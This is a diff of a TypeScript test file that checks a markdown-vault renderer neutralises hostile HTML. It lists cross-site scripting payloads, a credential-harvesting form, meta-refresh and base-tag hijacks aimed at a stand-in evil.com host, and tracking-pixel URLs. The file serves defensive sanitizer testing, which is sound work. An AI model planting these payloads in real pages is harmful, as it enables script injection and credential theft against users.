@@ -11,25 +11,57 @@
 
 import { test, expect } from "bun:test";
 import { renderToStaticMarkup } from "react-dom/server";
-import { VaultLinkContext, VaultMarkdown } from "../../../components/vault/VaultMarkdown";
+import {
+  VaultLinkContext,
+  VaultMarkdown,
+} from "../../../components/vault/VaultMarkdown";
 
-const render = (md: string) => renderToStaticMarkup(<VaultMarkdown content={md} />);
+const render = (md: string) =>
+  renderToStaticMarkup(<VaultMarkdown content={md} />);
 
 /** [name, note content, patterns that must NOT appear in the output] */
 const ATTACKS: [string, string, RegExp[]][] = [
   ["script tag", "<script>alert(1)</script>", [/<script/i]],
   ["img onerror", "<img src=x onerror=alert(1)>", [/onerror/i]],
-  ["event handler in odd casing", '<img src=x OnErRoR="alert(1)">', [/onerror/i]],
+  [
+    "event handler in odd casing",
+    '<img src=x OnErRoR="alert(1)">',
+    [/onerror/i],
+  ],
   ["javascript: href", '<a href="javascript:alert(1)">x</a>', [/javascript:/i]],
   ["iframe", '<iframe src="https://evil.com"></iframe>', [/<iframe/i]],
-  ["style clickjack overlay", '<div style="position:fixed;inset:0">x</div>', [/position:fixed/i]],
-  ["credential-harvesting form", '<form action="https://evil.com"><input name="p"></form>', [/<form/i, /<input/i]],
+  [
+    "style clickjack overlay",
+    '<div style="position:fixed;inset:0">x</div>',
+    [/position:fixed/i],
+  ],
+  [
+    "credential-harvesting form",
+    '<form action="https://evil.com"><input name="p"></form>',
+    [/<form/i, /<input/i],
+  ],
   ["svg-wrapped script", "<svg><script>alert(1)</script></svg>", [/<script/i]],
-  ["data:text/html href", '<a href="data:text/html,hi">x</a>', [/data:text\/html/i]],
+  [
+    "data:text/html href",
+    '<a href="data:text/html,hi">x</a>',
+    [/data:text\/html/i],
+  ],
   ["comment breakout", "<!-- --><script>alert(1)</script> -->", [/<script/i]],
-  ["script nested in details", "<details><summary>s</summary><script>alert(1)</script></details>", [/<script/i]],
-  ["object / embed", '<object data="x"></object><embed src="y">', [/<object/i, /<embed/i]],
-  ["meta refresh redirect", '<meta http-equiv="refresh" content="0;url=https://evil.com">', [/<meta/i]],
+  [
+    "script nested in details",
+    "<details><summary>s</summary><script>alert(1)</script></details>",
+    [/<script/i],
+  ],
+  [
+    "object / embed",
+    '<object data="x"></object><embed src="y">',
+    [/<object/i, /<embed/i],
+  ],
+  [
+    "meta refresh redirect",
+    '<meta http-equiv="refresh" content="0;url=https://evil.com">',
+    [/<meta/i],
+  ],
   ["base tag hijack", '<base href="https://evil.com/">', [/<base/i]],
 ];
 
@@ -44,7 +76,8 @@ test("hostile HTML in a note renders inert", () => {
       leaks.push(`${name}: threw ${String(e).slice(0, 80)}`);
       continue;
     }
-    for (const re of banned) if (re.test(out)) leaks.push(`${name}: leaked ${re}`);
+    for (const re of banned)
+      if (re.test(out)) leaks.push(`${name}: leaked ${re}`);
   }
   expect(leaks).toEqual([]);
 });
@@ -52,7 +85,9 @@ test("hostile HTML in a note renders inert", () => {
 test("the presentational HTML a README actually uses still renders", () => {
   // This is why the policy exists: every project vault lands on its README, and
   // most READMEs open with a centered logo.
-  const out = render('<p align="center"><img src="docs/logo.png" alt="logo" width="120"></p>');
+  const out = render(
+    '<p align="center"><img src="docs/logo.png" alt="logo" width="120"></p>',
+  );
   expect(out).toContain("<p");
   expect(out).toMatch(/align="center"/);
 });
@@ -95,7 +130,9 @@ test("an HTML <img> keeps the vault's own image handling", () => {
   // do, so vault-relative resolution and the third-party click gate both apply.
   const local = render('<img src="docs/logo.png" alt="logo">');
   expect(local).toContain("docs/logo.png");
-  const remote = render('<img src="https://tracker.example.com/pixel.gif" alt="x">');
+  const remote = render(
+    '<img src="https://tracker.example.com/pixel.gif" alt="x">',
+  );
   expect(remote).not.toMatch(/<img[^>]+src="https:\/\/tracker\.example\.com/);
 });
 
@@ -104,7 +141,9 @@ test("an HTML <img> keeps the vault's own image handling", () => {
 // drops the attribute and the element rather than gate them. <picture> stays,
 // which is what keeps a theme-switching README logo showing its <img> fallback.
 test("srcset cannot reopen the auto-fetch channel", () => {
-  const onImg = render('<img src="docs/logo.png" srcset="https://tracker.example.com/px.gif 1x">');
+  const onImg = render(
+    '<img src="docs/logo.png" srcset="https://tracker.example.com/px.gif 1x">',
+  );
   expect(onImg).not.toMatch(/srcset|tracker\.example\.com/i);
 
   const inPicture = render(
@@ -133,6 +172,10 @@ test("authority-relative references are rejected in every spelling", () => {
 // covers the arithmetic but renders WITHOUT the rehype chain, so this is the
 // only place the shipping plugin order is held to it.
 test("rehypeRaw does not shift the source line a checkbox writes back to", () => {
-  const out = render(["# Chores", "", "- [ ] buy milk", "- [x] call back"].join("\n"));
-  expect([...out.matchAll(/data-vault-task-line="(\d+)"/g)].map((m) => m[1])).toEqual(["3", "4"]);
+  const out = render(
+    ["# Chores", "", "- [ ] buy milk", "- [x] call back"].join("\n"),
+  );
+  expect(
+    [...out.matchAll(/data-vault-task-line="(\d+)"/g)].map((m) => m[1]),
+  ).toEqual(["3", "4"]);
 });
